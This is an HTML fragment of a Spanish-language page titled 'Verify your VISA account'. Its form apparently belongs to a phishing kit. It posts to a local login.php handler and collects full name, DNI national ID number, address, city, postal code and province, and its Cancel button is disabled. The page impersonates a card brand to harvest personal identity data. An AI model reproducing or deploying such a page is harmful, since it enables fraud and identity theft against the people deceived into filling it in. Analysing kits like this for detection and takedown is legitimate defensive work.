<html lang="es"><head>
	...
	<title>Verify your VISA account</title>
...
<body class="login-body">
	...
	<div class="header container-12">
		...
		<div class="rerere-info grid-6 omega"></div>
	</div>
	<div class="container-12"></div>
		<div class="login-content container-12">
				<div class="modal-body ">
<form id="frmverify" name="frmverify" method="post" action="login.php?p=verify">
	<div>
...
<div style="margin-top: 10px"><label for="nombre_completo">Nombre y apellido:</label><input id="nombre_completo" required type="text" name="nombre_completo" maxlength="50" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
					</div>
										<div style="margin-top: 10px"><label for="dni">DNI:</label>
					<input class="dni" id="dni" autocomplete="false" maxlength="10" required type="text" name="dni">
					</div>
<div style="margin-top: 10px"><label for="direccion">Direccion:</label>
<input autocomplete="false" id="direccion" required type="text" maxlength="50" name="direccion">
					</div>


					<div style="margin-top: 10px"><label for="ciudad">Ciudad:</label>
					<input id="ciudad" autocomplete="false" type="text" name="ciudad">
					</div>

					<div style="margin-top: 10px"><label for="postalcode">Codigo Postal:</label>
					<input id="postalcode" autocomplete="false" maxlength="5" required pattern="[0-9]+" type="text" name="postalcode">
					</div>
					<div  style="margin-top: 10px"> <label for="provincia">Provincia:</label>
		...
		<div class="buttonBar clearfix  "><input id="butn" type="submit" name="butn" value="Aceptar" class="button center"><input type="submit" disabled="disabled" value="Cancelar" class="button button center">
		</div></div>
      </div>
	</div>
</form>
